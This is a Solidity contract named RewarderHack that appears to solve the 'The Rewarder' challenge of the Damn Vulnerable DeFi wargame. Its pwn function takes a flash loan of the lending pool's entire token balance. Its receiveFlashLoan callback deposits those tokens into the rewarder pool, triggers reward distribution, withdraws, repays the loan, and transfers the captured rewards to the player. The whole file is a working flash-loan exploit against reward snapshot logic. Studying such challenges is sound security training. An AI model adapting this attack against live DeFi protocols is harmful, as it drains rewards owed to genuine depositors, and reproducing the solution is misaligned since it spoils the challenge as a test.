// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import {TheRewarderPool} from "./TheRewarderPool.sol";
import {RewardToken} from "./RewardToken.sol";
import {FlashLoanerPool} from "./FlashLoanerPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

import "hardhat/console.sol";

contract RewarderHack {
    TheRewarderPool public immutable rewarderPool;
    FlashLoanerPool public immutable flashLoanerPool;
    DamnValuableToken public immutable liquidityToken;
    RewardToken public immutable rewardToken;
    address player;

    constructor(
        TheRewarderPool _rewarderPool,
        FlashLoanerPool _flashLoanerPool,
        DamnValuableToken _liquidityToken,
        RewardToken _rewardToken,
        address _player
    ) {
        rewarderPool = _rewarderPool;
        flashLoanerPool = _flashLoanerPool;
        liquidityToken = _liquidityToken;
        rewardToken = _rewardToken;
        player = _player;
    }

    function pwn() external {
        flashLoanerPool.flashLoan(
            liquidityToken.balanceOf(address(flashLoanerPool))
        );
        rewardToken.transfer(
            payable(player),
            rewardToken.balanceOf(address(this))
        );
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.distributeRewards();
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanerPool), amount);
    }
}
